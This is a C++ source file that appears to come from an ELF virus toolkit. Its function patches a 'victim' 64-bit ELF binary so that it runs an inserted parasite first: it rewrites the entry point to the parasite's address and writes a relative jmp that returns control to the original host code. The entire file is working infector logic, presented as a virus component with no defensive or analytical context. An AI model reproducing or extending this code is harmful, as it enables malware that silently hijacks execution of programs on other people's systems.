#include "redirection/entry_point.hh"

namespace vt::redirection {

bool patch_entry_point(Elf64_Addr parasite_entry_address,
                       Elf64_Off parasite_file_offset,
                       Elf64_Off patch_offset_from_parasite_start,
                       std::span<std::byte> victim) {
  // For x86-64, patch the jmp address to the original entry point.
  // It is assumed that the inserted virus has at least 8 bytes of noop and
  // that's where it jumps back to host.
  // jmp rel32 e9 xxxxxxxx The rel32 offset is from the next instruction after
  // the jmp. The patched jump instruction is always 5 bytes.
  auto& ehdr = reinterpret_cast<Elf64_Ehdr&>(*victim.data());

  // Calculate the difference between original (destination) and the next
  // instruction after the jmp.
  int32_t rel = ehdr.e_entry -
                (parasite_entry_address + patch_offset_from_parasite_start + 5);

  constexpr uint64_t branch_op_code = 0xe9;
  auto* patch_addr =
      &victim[parasite_file_offset + patch_offset_from_parasite_start];
  *reinterpret_cast<uint64_t*>(patch_addr) = branch_op_code;
  *(int32_t*)(&victim[parasite_file_offset + patch_offset_from_parasite_start +
                      1]) = rel;

  ehdr.e_entry = parasite_entry_address;
  return true;
}

}  // namespace vt::redirection
